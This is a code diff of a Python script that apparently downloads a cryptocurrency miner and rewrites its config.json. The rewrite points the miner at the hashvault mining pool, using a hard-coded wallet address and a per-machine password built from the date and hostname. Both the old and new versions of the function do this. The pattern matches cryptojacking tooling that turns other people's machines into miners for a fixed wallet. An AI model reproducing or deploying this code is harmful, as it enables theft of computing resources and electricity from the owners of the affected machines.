@@ -112,34 +112,23 @@ def download_and_extract(url, dest_dir):
 
 def update_config_json(extracted_dir):
     config_path = os.path.join(extracted_dir, "config.json")
-
-    if os.path.exists(config_path):
-        with open(config_path, "r") as f:
-            try:
-                config = json.load(f)
-            except json.JSONDecodeError:
-                config = {}
-    else:
-        config = {}
-
-    if "pools" not in config or not isinstance(config["pools"], list):
-        config["pools"] = []
-
-    pool = {
-        "url": "pool.hashvault.pro:443",
-        "user": "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu",
-        "pass": f"{datetime.now():%Y%m%d}{socket.gethostname()}",
-        "tls": True,
-        "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
-    }
-
-    if config["pools"]:
-        config["pools"][0].update(pool)
-    else:
-        config["pools"].append(pool)
-
-    with open(config_path, "w") as f:
-        json.dump(config, f, indent=4)
+    if not os.path.exists(config_path):
+        print("config.json not found in extracted folder.")
+        return
+    try:
+        with open(config_path, 'r', encoding='utf-8') as f:
+            config = json.load(f)
+        if 'pools' in config and isinstance(config['pools'], list) and len(config['pools']) > 0:
+            pool = config['pools'][0]
+            pool['url'] = "pool.hashvault.pro:443"
+            pool['user'] = "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu"
+            pool['pass'] = f"{datetime.now():%Y%m%d}{socket.gethostname()}"
+            pool['tls'] = True
+            pool['tls-fingerprint'] = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+        with open(config_path, 'w', encoding='utf-8') as f:
+            json.dump(config, f, indent=4)
+    except Exception as e:
+        print(f"[!] Failed to update config.json: {e}")
 
 def compare_versions(v1, v2):
     return [int(x) for x in v1.split(".")] < [int(x) for x in v2.split(".")]
